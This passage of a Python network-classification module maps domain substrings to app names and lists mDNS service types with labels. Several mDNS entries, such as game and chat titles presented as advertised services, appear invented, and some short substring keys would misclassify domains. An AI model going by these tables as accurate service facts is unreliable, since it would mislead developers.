DOMAIN_TO_APP = {
    "facebook": APP_FACEBOOK, "fb.com": APP_FACEBOOK, "fbcdn": APP_FACEBOOK,
    "instagram": APP_INSTAGRAM, "cdninstagram": APP_INSTAGRAM,
    "whatsapp": APP_WHATSAPP, "wa.me": APP_WHATSAPP,
    "messenger": APP_MESSENGER, "m.me": APP_MESSENGER, "threads.net": APP_THREADS,
    "tiktok": APP_TIKTOK, "tiktokcdn": APP_TIKTOK, "byteoversea": APP_TIKTOK,
    "douyin": APP_DOUYIN, "kuaishou": APP_KUAISHOU,
    "snapchat": APP_SNAPCHAT, "snap.com": APP_SNAPCHAT, "sc-cdn": APP_SNAPCHAT,
    "twitter": APP_TWITTER, "twimg": APP_TWITTER, "x.com": APP_TWITTER,
    "reddit": APP_REDDIT, "redditmedia": APP_REDDIT,
    "discord": APP_DISCORD, "discordapp": APP_DISCORD,
    "telegram": APP_TELEGRAM, "t.me": APP_TELEGRAM, "signal.org": APP_SIGNAL,
    "wechat": APP_WECHAT, "weixin": APP_WECHAT, "wx.qq": APP_WECHAT,
    "qpic": APP_QQ, "gtimg": APP_QQ, "qq.com": APP_QQ, "tencent": APP_QQ,
    "line.me": APP_LINE, "kakao": APP_KAKAO, "viber": APP_VIBER,
    "imo.im": APP_IMO, "teams.microsoft": APP_TEAMS, "slack": APP_SLACK,
    "zoom": APP_ZOOM, "meet.google": APP_MEET, "skype": APP_SKYPE,
    "linkedin": APP_LINKEDIN, "licdn": APP_LINKEDIN, "pinterest": APP_PINTEREST,
    "pinimg": APP_PINTEREST, "tumblr": APP_TUMBLR, "mastodon": APP_MASTODON,
    "bsky.app": APP_BLUESKY, "vk.com": APP_VK, "ok.ru": APP_OKRU,
    "weibo": APP_WEIBO, "xiaohongshu": APP_XIAOHONGSHU, "zhihu": APP_ZHIHU,
    "quora": APP_QUORA, "youtube": APP_YOUTUBE, "googlevideo": APP_YOUTUBE,
    "ytimg": APP_YOUTUBE, "netflix": APP_NETFLIX, "nflxvideo": APP_NETFLIX,
    "twitch": APP_TWITCH, "ttvnw": APP_TWITCH, "primevideo": APP_PRIMEVIDEO,
    "disneyplus": APP_DISNEYPLUS, "hulu": APP_HULU, "hbomax": APP_HBOMAX,
    "peacocktv": APP_PEACOCK, "paramountplus": APP_PARAMOUNT,
    "crunchyroll": APP_CRUNCHYROLL, "vimeo": APP_VIMEO,
    "dailymotion": APP_DAILYMOTION,
    "hotstar": APP_HOTSTAR, "jiocinema": APP_JIOCINEMA, "sonyliv": APP_SONYLIV,
    "zee5": APP_ZEE5, "bilibili": APP_BILIBILI, "iqiyi": APP_IQIYI,
    "rumble": APP_RUMBLE, "odysee": APP_ODYSEE, "spotify": APP_SPOTIFY,
    "scdn.co": APP_SPOTIFY, "soundcloud": APP_SOUNDCLOUD, "sndcdn": APP_SOUNDCLOUD,
    "deezer": APP_DEEZER, "tidal": APP_TIDAL, "pandora": APP_PANDORA,
    "iheart": APP_IHEART, "audible": APP_AUDIBLE, "googleusercontent": APP_GOOGLE,
    "googleapis": APP_GOOGLE, "gstatic": APP_GOOGLE, "ggpht": APP_GOOGLE,
    "google": APP_GOOGLE, "googlesyndication": APP_GOOGLEADS,
    "doubleclick": APP_GOOGLEADS, "gmail": APP_GMAIL, "drive.google": APP_DRIVE,
    "docs.google": APP_DOCS, "photos.google": APP_PHOTOS, "maps.google": APP_MAPS,
    "play.google": APP_GPLAY, "firebaseio": APP_FIREBASE, "cloud.google": APP_CLOUD,
    "microsoft": APP_MICROSOFT, "outlook": APP_OUTLOOK, "office365": APP_OFFICE365,
    "onedrive": APP_ONEDRIVE, "sharepoint": APP_SHAREPOINT,
    "windowsupdate": APP_WINUPDATE, "azure": APP_AZURE, "apple": APP_APPLE,
    "cdn-apple": APP_APPLE, "appstore": APP_APPSTORE, "itunes": APP_ITUNES,
    "icloud": APP_ICLOUD, "amazonaws": APP_AWS, "cloudfront": APP_CLOUDFRONT,
    "amazon": APP_AMAZON, "cloudflare": APP_CLOUDFLARE, "akamai": APP_AKAMAI,
    "fastly": APP_FASTLY, "github": APP_GITHUB, "gitlab": APP_GITLAB,
    "stackoverflow": APP_STACKOVERFLOW, "npmjs": APP_NPM, "pypi": APP_PYPI,
    "docker": APP_DOCKER, "vercel": APP_VERCEL, "netlify": APP_NETLIFY,
    "openai": APP_OPENAI, "chatgpt": APP_OPENAI, "anthropic": APP_ANTHROPIC,
    "claude": APP_CLAUDE, "huggingface": APP_HUGGINGFACE, "paypal": APP_PAYPAL,
    "stripe": APP_STRIPE, "binance": APP_BINANCE, "coinbase": APP_COINBASE,
    "steam": APP_STEAM, "epicgames": APP_EPICGAMES, "riotgames": APP_RIOT,
    "roblox": APP_ROBLOX, "minecraft": APP_MINECRAFT,
    "playstation": APP_PLAYSTATION,
    "xboxlive": APP_XBOX, "nintendo": APP_NINTENDO, "uber": APP_UBER,
    "airbnb": APP_AIRBNB, "booking.com": APP_BOOKING, "expedia": APP_EXPEDIA,
    "speedtest": APP_SPEEDTEST,
    "temu": APP_TEMU, "shein": APP_SHEIN, "aliexpress": APP_ALIEXPRESS,
    "taobao": APP_TAOBAO, "jd.com": APP_JD, "flipkart": APP_FLIPKART,
    "etsy": APP_ETSY, "ebay": APP_EBAY, "walmart": APP_WALMART,
    "shopify": APP_SHOPIFY, "mercadolibre": APP_MERCADO, "rakuten": APP_RAKUTEN,
    "newegg": APP_NEWEGG, "wish.com": APP_WISH, "target.com": APP_TARGET,
    "bestbuy": APP_BESTBUY, "homedepot": APP_HOME_DEPOT, "ikea": APP_IKEA,
    "zozo": APP_ZOZOTOWN, "shopee": APP_SHOPEE, "lazada": APP_LAZADA,
    "daraz": APP_DARAZ, "noon.com": APP_NOON, "jumia": APP_JUMIA,
    "kick.com": APP_KICK, "trovo": APP_TROVO, "nicovideo": APP_NICOVIDEO,
    "acfun": APP_ACFUN, "douyu": APP_DOUYU, "huya": APP_HUYA,
    "bigo.tv": APP_BIGO, "showroom": APP_SHOWROOM, "17.live": APP_17LIVE,
    "pococha": APP_POCCO, "iriam": APP_IRIAM, "reality": APP_REALITY,
    "mildom": APP_MILDOM, "openrec": APP_OPENREC, "twitcasting": APP_TWITCAST,
    "mixch": APP_MIXCH, "frfr": APP_FRFR,
    "naver": APP_NAVER, "daum": APP_DAUM, "whale": APP_WHALE,
    "webtoon": APP_WEBTOON, "tapas": APP_TAPAS, "wattpad": APP_WATTPAD,
    "royalroad": APP_ROYALROAD, "scribblehub": APP_SCRIBBLEHUB,
    "archiveofourown": APP_AO3, "fanfiction": APP_FANFICTION,
    "qqmusic": APP_QQMUSIC, "netease": APP_NETEASE_MUSIC, "kugou": APP_KUGOU,
    "kuwo": APP_KUWO, "migu": APP_MIGU, "joox": APP_JOX_MUSIC,
    "melon": APP_MELON, "genie": APP_GENIE_MUSIC, "bugsmusic": APP_BUGS,
    "flomusic": APP_FLO, "vibe.naver": APP_VIBE, "gaana": APP_GAANA,
    "jiosaavn": APP_JIOSAAVN, "wynk": APP_WYNK, "resso": APP_RESSO,
    "boomplay": APP_BOOM_PLAY, "audiomack": APP_AUDIOMACK,
    "napster": APP_NAPSTER, "8tracks": APP_8TRACKS, "mixcloud": APP_MIXCLOUD,
    "bandcamp": APP_BANDCAMP, "juno": APP_JUNO, "beatport": APP_BEATPORT,
    "traxsource": APP_TRAXSOURCE,
    "dingtalk": APP_DINGTALK, "feishu": APP_FEISHU, "wecom": APP_WECHAT_WORK,
    "qqmail": APP_QQ_MAIL, "163.com": APP_163_MAIL, "126.com": APP_126_MAIL,
    "yandex.mail": APP_YANDEX_MAIL, "mail.ru": APP_MAIL_RU,
    "protonmail": APP_PROTONMAIL, "tutanota": APP_TUTANOTA,
    "fastmail": APP_FASTMAIL, "zoho": APP_ZOHO_MAIL, "gmx": APP_GMX,
    "aol.com": APP_AOL_MAIL,
    "dropbox": APP_DROPBOX, "box.com": APP_BOX, "mega.nz": APP_MEGA,
    "pcloud": APP_PCLOUD, "sync.com": APP_SYNC_COM, "icedrive": APP_ICEDRIVE,
    "mediafire": APP_MEDIAFIRE, "wetransfer": APP_WETRANSFER,
    "notion": APP_NOTION, "obsidian": APP_OBSIDIAN, "evernote": APP_EVERNOTE,
    "onenote": APP_ONENOTE, "airtable": APP_AIRTABLE, "trello": APP_TRELLO,
    "asana": APP_ASANA, "monday.com": APP_MONDAY, "clickup": APP_CLICKUP,
    "jira": APP_JIRA, "confluence": APP_CONFLUENCE, "linear.app": APP_LINEAR,
    "basecamp": APP_BASE_CAMP, "miro": APP_MIRO, "figma": APP_FIGMA,
    "canva": APP_CANVA, "adobe": APP_ADOBE_CC, "autodesk": APP_AUTOCAD,
    "sketchup": APP_SKETCHUP, "solidworks": APP_SOLIDWORKS,
    "blender": APP_BLENDER, "unity3d": APP_UNITY, "unrealengine": APP_UNREAL,
    "ea.com": APP_EA_ORIGIN, "ubisoft": APP_UBISOFT, "gog.com": APP_GOG,
    "itch.io": APP_ITCHIO, "humblebundle": APP_HUMBLE,
    "nvidia": APP_GEFORCE_NOW, "shadow.tech": APP_SHADOW_PC,
    "parallels": APP_PARALLELS, "vmware": APP_VMWARE,
    "virtualbox": APP_VIRTUALBOX,
    "docker.io": APP_DOCKER_HUB, "kubernetes": APP_KUBERNETES,
    "terraform": APP_TERRAFORM, "ansible": APP_ANSIBLE, "jenkins": APP_JENKINS,
    "circleci": APP_CIRCLE_CI, "travis-ci": APP_TRAVIS,
    "codingame": APP_CODING, "codecademy": APP_CODECADEMY,
    "coursera": APP_COURSERA, "udemy": APP_UDEMY, "edx": APP_EDX,
    "khanacademy": APP_KHAN_ACADEMY, "duolingo": APP_DUOLINGO,
    "babbel": APP_BABEL, "rosettastone": APP_ROSETTA_STONE,
    "memrise": APP_MEMRISE, "busuu": APP_BUSUU, "lingoda": APP_LINGODA,
    "italki": APP_ITALKI, "meetup": APP_MEETUP, "eventbrite": APP_EVENTBRITE,
    "ticketmaster": APP_TICKETMASTER, "stubhub": APP_STUBHUB,
    "seatgeek": APP_SEATGEEK, "dice.fm": APP_DICE, "bandsintown": APP_BANDSINTOWN,
    "songkick": APP_SONGKICK, "residentadvisor": APP_RESIDENT_ADVISOR,
    "agoda": APP_AGODA, "hotels.com": APP_HOTELS, "trivago": APP_TRIVAGO,
    "kayak": APP_KAYAK, "skyscanner": APP_SKYSCANNER,
    "momondo": APP_MOMONDO, "hopper": APP_HOPPER, "rome2rio": APP_ROME2RIO,
    "omio": APP_OMIO, "trainline": APP_TRAINLINE,
    "hellotalk": APP_HELLOTALK, "tandem": APP_TANDEM, "speaky": APP_SPEAKY,
    "interpals": APP_INTERPALS, "tinder": APP_TINDER, "bumble": APP_BUMBLE,
    "hinge": APP_HINGE, "okcupid": APP_OKCUPID, "match.com": APP_MATCH,
    "pof.com": APP_PLENTY_OF_FISH, "grindr": APP_GRINDR, "weareher": APP_HER,
    "scruff": APP_SCRUFF, "coffeemeetsbagel": APP_COFFEE_MEETS_BAGEL,
    "lovoo": APP_LOVOO, "jaumo": APP_JAUMO, "badoo": APP_BADOO,
    "meetme": APP_MEETME, "yubo": APP_YUBO, "houseparty": APP_HOUSE_PARTY,
    "monkey.app": APP_MONKEY, "omegle": APP_OMEGLE,
    "chatroulette": APP_CHATROULETTE, "flingster": APP_FLINGSTER,
    "grab.com": APP_GRAB, "gojek": APP_GOJEK, "didiglobal": APP_DIDI,
    "bolt.eu": APP_BOLT, "careem": APP_CAREM, "lyft": APP_LYFT,
    "indrive": APP_INDRIVE, "olacabs": APP_OLA, "rapido": APP_RAPIDO,
    "pathao": APP_PATHao, "obhai": APP_OBHAI, "shohoz": APP_SHOHOZ,
    "swiggy": APP_SWIGGY, "zomato": APP_ZOMATO, "doordash": APP_DOORDASH,
    "grubhub": APP_GRUBHUB, "ubereats": APP_UBER_EATS,
    "deliveroo": APP_DELIVEROO,
    "just-eat": APP_JUST_EAT, "takeaway": APP_TAKEAWAY,
    "deliveryhero": APP_DELIVERY_HERO, "foodpanda": APP_FOODPANDA,
    "ele.me": APP_ELEME, "meituan": APP_MEITUAN, "baemin": APP_BAEMIN,
    "yogiyo": APP_YOGIYO, "demae-can": APP_DEMAE, "ifood": APP_IFOOD,
    "rappi": APP_RAPPI, "pedidosya": APP_PEDIDOSYA, "glovo": APP_GLOVO,
    "wolt": APP_WOLT, "blinkit": APP_BLINKIT, "zepto": APP_ZEPTO,
    "instacart": APP_INSTACART, "gopuff": APP_GO_PUFF, "getir": APP_GETIR,
    "gorillas": APP_GORILLAS, "flink": APP_FLINK, "cainiao": APP_CAINIAO,
    "fedex": APP_FEDEX, "ups.com": APP_UPS, "dhl": APP_DHL,
    "usps": APP_USPS, "royalmail": APP_ROYAL_MAIL,
    "poste.it": APP_POSTE_ITALIANE,
    "laposte": APP_LA_POSTE, "dpd": APP_DPD, "gls-group": APP_GLS,
    "hermes": APP_HERMES, "yodel": APP_YODEL, "evri": APP_EVRI,
    "17track": APP_TRACK_17, "aftership": APP_AFTERSHIP, "ship24": APP_SHIP24,
    "mxtoolbox": APP_MXTOOLBOX, "dnschecker": APP_DNSCHECKER,
    "intodns": APP_INTODNS, "viewdns": APP_VIEWDNS,
    "pingdom": APP_PINGDOM, "uptimerobot": APP_UPTIMEROBOT,
    "statuscake": APP_STATUSCAKE, "betterstack": APP_BETTER_STACK,
    "datadoghq": APP_DATADOG, "newrelic": APP_NEW_RELIC,
    "dynamics": APP_DYNAMICS, "sentry.io": APP_SENTRY,
    "bugsnag": APP_BUGSNAG, "rollbar": APP_ROLLBAR, "loggly": APP_LOGGLY,
    "papertrail": APP_PAPERTRAIL, "splunk": APP_SPLUNK, "elastic": APP_ELASTIC,
    "grafana": APP_GRAFANA, "prometheus": APP_PROMETHEUS,
    "influxdata": APP_INFLUXDB, "timescale": APP_TIMESCALE,
    "clickhouse": APP_CLICKHOUSE, "snowflake": APP_SNOWFLAKE,
    "bigquery": APP_BIGQUERY, "redshift": APP_REDSHIFT,
    "databricks": APP_DATABRICKS, "tableau": APP_TABLEAU,
    "looker": APP_LOOKER, "powerbi": APP_POWERBI, "qlik": APP_QLIK,
    "superset": APP_SUPERSET, "metabase": APP_METABASE, "redash": APP_REDASH,
    "jasper.ai": APP_JASPER, "copy.ai": APP_COPY_AI,
    "writesonic": APP_WRITESONIC,
    "midjourney": APP_MIDJOURNEY, "dall-e": APP_DALLE,
    "stability.ai": APP_STABLE_DIFFUSION, "leonardo.ai": APP_LEONARDO_AI,
    "runwayml": APP_RUNWAY, "pika.art": APP_PIKA, "sora": APP_SORA,
    "elevenlabs": APP_ELEVENLABS, "suno.com": APP_SUNO, "udio.com": APP_UDIO,
    "murf.ai": APP_MURF, "descript": APP_DESCRIPT, "otter.ai": APP_OTTER,
    "fireflies.ai": APP_FIREFLIES, "grain.com": APP_GRAIN,
    "fathom.video": APP_FATHOM,
    "tactiq.io": APP_TACTIQ, "loom.com": APP_LOOM, "vidyard": APP_VIDYARD,
    "wistia": APP_WISTIA, "brightcove": APP_BRIGHTCOVE, "kaltura": APP_KALTURA,
    "panopto": APP_PANOPTO, "techsmith": APP_TECHSMITH,
    "camtasia": APP_CAMTASIA,
    "screenflow": APP_SCREENFLOW, "obsproject": APP_OBS,
    "streamlabs": APP_STREAMLABS,
    "streamelements": APP_STREAMELEMENTS, "nightbot": APP_NIGHTBOT,
    "streer": APP_STREER, "mixitup": APP_MIXITUP,
}

def domain_to_app(dom):
    if not dom: return None
    dl = dom.lower(); best = None; best_len = -1
    for k, v in DOMAIN_TO_APP.items():
        if k in dl and len(k) > best_len:
            best_len = len(k); best = v
    return best

MDNS_SERVICES = {
    "_airplay._tcp": ("AirPlay","Apple TV / HomePod"),
    "_googlecast._tcp": ("Google Cast","Chromecast"),
    "_spotify-connect._tcp": ("Spotify Connect","Speakers"),
    "_smb._tcp": ("SMB","File share"),
    "_printer._tcp": ("Printer","LPD"),
    "_ipp._tcp": ("Printer (IPP)","IPP"),
    "_ipps._tcp": ("IPPS","Printer"),
    "_matter._tcp": ("Matter","Smart home"),
    "_http._tcp": ("HTTP","Web"),
    "_https._tcp": ("HTTPS","TLS web"),
    "_rdp._tcp": ("RDP","Remote desktop"),
    "_vnc._tcp": ("VNC","Remote"),
    "_services._dns-sd._udp": ("mDNS List","DNS-SD"),
    "_afpovertcp._tcp": ("AppleShare","AFP"),
    "_adisk._tcp": ("Time Capsule","Time Machine"),
    "_device-info._tcp": ("Device Info","Apple"),
    "_airdrop._tcp": ("AirDrop","Apple"),
    "_companion-link._tcp": ("Apple Continuity","Handoff"),
    "_raop._tcp": ("AirPlay Audio","RAOP"),
    "_remotepairing._tcp": ("Remote Pairing","Apple"),
    "_sleep-proxy._tcp": ("Sleep Proxy","Bonjour"),
    "_touch-able._tcp": ("Remote App","Apple Remote"),
    "_homekit._tcp": ("HomeKit","Apple Home"),
    "_hap._tcp": ("HomeKit Accessory","HAP"),
    "_hue._tcp": ("Philips Hue","Lighting"),
    "_esphomelib._tcp": ("ESPHome","IoT"),
    "_tasmota._tcp": ("Tasmota","IoT"),
    "_shelly._tcp": ("Shelly","IoT"),
    "_tuya._tcp": ("Tuya","IoT"),
    "_sonoff._tcp": ("Sonoff","IoT"),
    "_ewelink._tcp": ("eWeLink","IoT"),
    "_miio._tcp": ("Xiaomi MiIO","IoT"),
    "_xiaomi._tcp": ("Xiaomi","IoT"),
    "_amazonecho._tcp": ("Amazon Echo","Alexa"),
    "_amzn-wplay._tcp": ("Amazon WPLay","Alexa"),
    "_alexa._tcp": ("Amazon Alexa","Voice"),
    "_googlezone._tcp": ("Google Zone","Cast"),
    "_androidtvremote._tcp": ("Android TV Remote","TV"),
    "_androidtvremote2._tcp": ("Android TV Remote v2","TV"),
    "_viziocast._tcp": ("Vizio Cast","TV"),
    "_roku-rcp._tcp": ("Roku Remote","TV"),
    "_roku._tcp": ("Roku","TV"),
    "_samsungmsf._tcp": ("Samsung TV","TV"),
    "_samsungsmartview._tcp": ("Samsung SmartView","TV"),
    "_lg-smartshare._tcp": ("LG SmartShare","TV"),
    "_lgtv._tcp": ("LG Smart TV","TV"),
    "_webostv._tcp": ("LG WebOS TV","TV"),
    "_sony._tcp": ("Sony","TV"),
    "_bravia._tcp": ("Sony Bravia","TV"),
    "_philipstv._tcp": ("Philips TV","TV"),
    "_panasonic._tcp": ("Panasonic","TV"),
    "_hisense._tcp": ("Hisense","TV"),
    "_tcl._tcp": ("TCL","TV"),
    "_vizio._tcp": ("Vizio","TV"),
    "_sonos._tcp": ("Sonos","Speakers"),
    "_sonos-smapi._tcp": ("Sonos SMAPI","Speakers"),
    "_bose._tcp": ("Bose","Speakers"),
    "_soundtouch._tcp": ("Bose SoundTouch","Speakers"),
    "_bang-olufsen._tcp": ("Bang & Olufsen","Speakers"),
    "_heos._tcp": ("Denon HEOS","Speakers"),
    "_airport._tcp": ("Apple AirPort","Router"),
    "_rfb._tcp": ("VNC (RFB)","Remote"),
    "_xdmcp._udp": ("XDMCP","X11"),
    "_sftp-ssh._tcp": ("SFTP","SSH"),
    "_ssh._tcp": ("SSH","Remote shell"),
    "_telnet._tcp": ("Telnet","Legacy"),
    "_ftp._tcp": ("FTP","File transfer"),
    "_ftps._tcp": ("FTPS","File transfer"),
    "_nfs._tcp": ("NFS","File share"),
    "_webdav._tcp": ("WebDAV","File share"),
    "_webdavs._tcp": ("WebDAV SSL","File share"),
    "_cifs._tcp": ("CIFS","File share"),
    "_pdl-datastream._tcp": ("Raw Printer","Printer"),
    "_scanner._tcp": ("Scanner","Scanner"),
    "_uscan._tcp": ("eSCL Scanner","Scanner"),
    "_uscans._tcp": ("eSCL Scanner SSL","Scanner"),
    "_privet._tcp": ("Google Cloud Print","Print"),
    "_googlecloudprint._tcp": ("Google Cloud Print (extra)","Print"),
    "_airprint._tcp": ("AirPrint","Printer"),
    "_daap._tcp": ("DAAP","iTunes"),
    "_dpap._tcp": ("DPAP","iPhoto"),
    "_ica-networking._tcp": ("Citrix ICA","VDI"),
    "_ms-wbt-server._tcp": ("MS WBT","RDP"),
    "_workstation._tcp": ("Workstation","LAN"),
    "_mediaremotetv._tcp": ("Apple TV Remote","Apple TV"),
    "_appletv-v2._tcp": ("Apple TV v2","Apple TV"),
    "_appletv-v3._tcp": ("Apple TV v3","Apple TV"),
    "_lifx._tcp": ("LIFX","Lighting"),
    "_nanoleaf._tcp": ("Nanoleaf","Lighting"),
    "_yeelight._tcp": ("Yeelight","Lighting"),
    "_wiz._tcp": ("WiZ","Lighting"),
    "_govee._tcp": ("Govee","Lighting"),
    "_twinkly._tcp": ("Twinkly","Lighting"),
    "_thread._tcp": ("Thread","Home"),
    "_airtunes._tcp": ("AirTunes","Audio"),
    "_rdlink._tcp": ("Remote Desktop Link","Apple"),
    "_apple-mobdev2._tcp": ("Apple Mobile Device","Apple"),
    "_nvstream._tcp": ("NVIDIA Stream","Gaming"),
    "_nvstreamdiag._tcp": ("NVIDIA Stream Diag","Gaming"),
    "_steamcmd._tcp": ("Steam CMD","Gaming"),
    "_steam._tcp": ("Steam","Gaming"),
    "_steamlink._tcp": ("Steam Link","Gaming"),
    "_ps4._tcp": ("PlayStation 4","Gaming"),
    "_ps5._tcp": ("PlayStation 5","Gaming"),
    "_xbox._tcp": ("Xbox","Gaming"),
    "_xbox-live._tcp": ("Xbox Live","Gaming"),
    "_nintendo._tcp": ("Nintendo","Gaming"),
    "_switch._tcp": ("Nintendo Switch","Gaming"),
    "_minecraft._tcp": ("Minecraft LAN","Gaming"),
    "_roblox._tcp": ("Roblox","Gaming"),
    "_epicgames._tcp": ("Epic Games","Gaming"),
    "_riotgames._tcp": ("Riot Games","Gaming"),
    "_leagueoflegends._tcp": ("League of Legends","Gaming"),
    "_valorant._tcp": ("VALORANT","Gaming"),
    "_fortnite._tcp": ("Fortnite","Gaming"),
    "_pubg._tcp": ("PUBG","Gaming"),
    "_callofduty._tcp": ("Call of Duty","Gaming"),
    "_battlefield._tcp": ("Battlefield","Gaming"),
    "_fifa._tcp": ("FIFA","Gaming"),
    "_gta._tcp": ("GTA Online","Gaming"),
    "_rockstargames._tcp": ("Rockstar Games","Gaming"),
    "_ubisoft._tcp": ("Ubisoft","Gaming"),
    "_ea._tcp": ("EA","Gaming"),
    "_blizzard._tcp": ("Blizzard","Gaming"),
    "_worldofwarcraft._tcp": ("WoW","Gaming"),
    "_overwatch._tcp": ("Overwatch","Gaming"),
    "_diablo._tcp": ("Diablo","Gaming"),
    "_hearthstone._tcp": ("Hearthstone","Gaming"),
    "_starcraft._tcp": ("StarCraft","Gaming"),
    "_heroesofthestorm._tcp": ("Heroes of the Storm","Gaming"),
    "_discord._tcp": ("Discord RPC","Gaming"),
    "_slack._tcp": ("Slack","Chat"),
    "_teams._tcp": ("MS Teams","Chat"),
    "_zoom._tcp": ("Zoom","Chat"),
    "_webex._tcp": ("Webex","Chat"),
    "_meet._tcp": ("Google Meet","Chat"),
    "_skype._tcp": ("Skype","Chat"),
    "_whatsapp._tcp": ("WhatsApp","Chat"),
    "_telegram._tcp": ("Telegram","Chat"),
    "_signal._tcp": ("Signal","Chat"),
    "_viber._tcp": ("Viber","Chat"),
    "_line._tcp": ("LINE","Chat"),
    "_kakao._tcp": ("KakaoTalk","Chat"),
    "_wechat._tcp": ("WeChat","Chat"),
    "_messenger._tcp": ("Messenger","Chat"),
    "_facetime._tcp": ("FaceTime","Chat"),
    "_imessage._tcp": ("iMessage","Chat"),
    "_ringcentral._tcp": ("RingCentral","Chat"),
    "_dialpad._tcp": ("Dialpad","Chat"),
    "_gotomeeting._tcp": ("GoToMeeting","Chat"),
    "_bluejeans._tcp": ("BlueJeans","Chat"),
    "_jitsi._tcp": ("Jitsi","Chat"),
    "_whereby._tcp": ("Whereby","Chat"),
    "_around._tcp": ("Around","Chat"),
    "_mattermost._tcp": ("Mattermost","Chat"),
    "_rocketchat._tcp": ("Rocket.Chat","Chat"),
    "_zulip._tcp": ("Zulip","Chat"),
    "_element._tcp": ("Element","Chat"),
    "_matrix._tcp": ("Matrix","Chat"),
    "_xmpp-client._tcp": ("XMPP","Chat"),
    "_xmpp-server._tcp": ("XMPP Server","Chat"),
    "_irc._tcp": ("IRC","Chat"),
    "_http-alt._tcp": ("HTTP Alt","Web"),
    "_caldav._tcp": ("CalDAV","Calendar"),
    "_caldavs._tcp": ("CalDAV SSL","Calendar"),
    "_carddav._tcp": ("CardDAV","Contacts"),
    "_carddavs._tcp": ("CardDAV SSL","Contacts"),
    "_ldap._tcp": ("LDAP","Directory"),
    "_ldaps._tcp": ("LDAPS","Directory"),
    "_kerberos._tcp": ("Kerberos","Auth"),
    "_kpasswd._udp": ("Kerberos PW","Auth"),
    "_radius._udp": ("RADIUS","Auth"),
    "_radius-acct._udp": ("RADIUS Acct","Auth"),
    "_tacacs._tcp": ("TACACS","Auth"),
    "_ntp._udp": ("NTP","Time"),
    "_sntp._udp": ("SNTP","Time"),
    "_ptp._udp": ("PTP","Time"),
    "_git._tcp": ("Git","Dev"),
    "_hg._tcp": ("Mercurial","Dev"),
    "_svn._tcp": ("Subversion","Dev"),
    "_perforce._tcp": ("Perforce","Dev"),
    "_x11._tcp": ("X11","Unix"),
    "_docker._tcp": ("Docker","Dev"),
    "_kubernetes._tcp": ("Kubernetes","Dev"),
    "_etcd._tcp": ("etcd","Dev"),
    "_consul._tcp": ("Consul","Dev"),
    "_vault._tcp": ("Vault","Dev"),
    "_nomad._tcp": ("Nomad","Dev"),
    "_prometheus._tcp": ("Prometheus","Dev"),
    "_grafana._tcp": ("Grafana","Dev"),
    "_influxdb._tcp": ("InfluxDB","Dev"),
    "_redis._tcp": ("Redis","Dev"),
    "_mongo._tcp": ("MongoDB","Dev"),
    "_postgres._tcp": ("PostgreSQL","Dev"),
    "_mysql._tcp": ("MySQL","Dev"),
    "_mariadb._tcp": ("MariaDB","Dev"),
    "_oracle._tcp": ("Oracle","Dev"),
    "_mssql._tcp": ("MSSQL","Dev"),
    "_cassandra._tcp": ("Cassandra","Dev"),
    "_couchdb._tcp": ("CouchDB","Dev"),
    "_elasticsearch._tcp": ("Elasticsearch","Dev"),
    "_solr._tcp": ("Solr","Dev"),
    "_rabbitmq._tcp": ("RabbitMQ","Dev"),
    "_kafka._tcp": ("Kafka","Dev"),
    "_zookeeper._tcp": ("ZooKeeper","Dev"),
    "_nats._tcp": ("NATS","Dev"),
    "_mqtt._tcp": ("MQTT","IoT"),
    "_mqtts._tcp": ("MQTT SSL","IoT"),
    "_coap._udp": ("CoAP","IoT"),
    "_amqp._tcp": ("AMQP","IoT"),
    "_amqps._tcp": ("AMQPS","IoT"),
    "_stun._udp": ("STUN","VoIP"),
    "_stuns._tcp": ("STUN SSL","VoIP"),
    "_turn._udp": ("TURN","VoIP"),
    "_turns._tcp": ("TURN SSL","VoIP"),
    "_sip._udp": ("SIP","VoIP"),
    "_sip._tcp": ("SIP TCP","VoIP"),
    "_sips._tcp": ("SIP SSL","VoIP"),
    "_h323._tcp": ("H.323","VoIP"),
    "_iax._udp": ("IAX","VoIP"),
    "_mgcp._udp": ("MGCP","VoIP"),
    "_rtsp._tcp": ("RTSP","Media"),
    "_rtp._udp": ("RTP","Media"),
    "_rtcp._udp": ("RTCP","Media"),
    "_hls._tcp": ("HLS","Media"),
    "_dash._tcp": ("DASH","Media"),
    "_webrtc._tcp": ("WebRTC","Media"),
    "_dns._udp": ("DNS","Core"),
    "_dns._tcp": ("DNS TCP","Core"),
    "_mdns._udp": ("mDNS","Core"),
    "_dhcp._udp": ("DHCP","Core"),
    "_dhcpv6._udp": ("DHCPv6","Core"),
    "_bootp._udp": ("BOOTP","Core"),
    "_tftp._udp": ("TFTP","Core"),
    "_syslog._udp": ("Syslog","Core"),
    "_snmp._udp": ("SNMP","Core"),
    "_snmp-trap._udp": ("SNMP Trap","Core"),
    "_netconf-ssh._tcp": ("NETCONF","Core"),
    "_restconf._tcp": ("RESTCONF","Core"),
    "_grpc._tcp": ("gRPC","Core"),
    "_thrift._tcp": ("Thrift","Core"),
    "_avahi._tcp": ("Avahi","Core"),
    "_systemd._tcp": ("systemd","Core"),
    "_cockpit._tcp": ("Cockpit","Core"),
    "_synology._tcp": ("Synology","NAS"),
    "_diskstation._tcp": ("Synology DiskStation","NAS"),
    "_qnap._tcp": ("QNAP","NAS"),
    "_qnap-nas._tcp": ("QNAP NAS","NAS"),
    "_wdmycloud._tcp": ("WD My Cloud","NAS"),
    "_drobo._tcp": ("Drobo","NAS"),
    "_freenas._tcp": ("TrueNAS","NAS"),
    "_truenas._tcp": ("TrueNAS (extra)","NAS"),
    "_unraid._tcp": ("Unraid","NAS"),
    "_openmediavault._tcp": ("OpenMediaVault","NAS"),
    "_plexmediasvr._tcp": ("Plex","Media"),
    "_plex._tcp": ("Plex (extra)","Media"),
    "_emby._tcp": ("Emby","Media"),
    "_jellyfin._tcp": ("Jellyfin","Media"),
    "_kodi._tcp": ("Kodi","Media"),
    "_xbmc._tcp": ("XBMC","Media"),
    "_serviio._tcp": ("Serviio","Media"),
    "_minidlna._tcp": ("MiniDLNA","Media"),
    "_dlna._tcp": ("DLNA","Media"),
    "_upnp._tcp": ("UPnP","Media"),
    "_ssdp._udp": ("SSDP","Media"),
    "_wifidirect._tcp": ("Wi-Fi Direct","Wireless"),
    "_wfd._tcp": ("Wi-Fi Display","Wireless"),
    "_wi-fi-direct._tcp": ("Wi-Fi Direct (extra)","Wireless"),
    "_wificonfig._tcp": ("Wi-Fi Config","Wireless"),
    "_wps._tcp": ("WPS","Wireless"),
    "_mesh._tcp": ("Mesh","Wireless"),
    "_easylink._tcp": ("EasyLink","Wireless"),
    "_onvif._tcp": ("ONVIF","Camera"),
    "_axis._tcp": ("Axis Camera","Camera"),
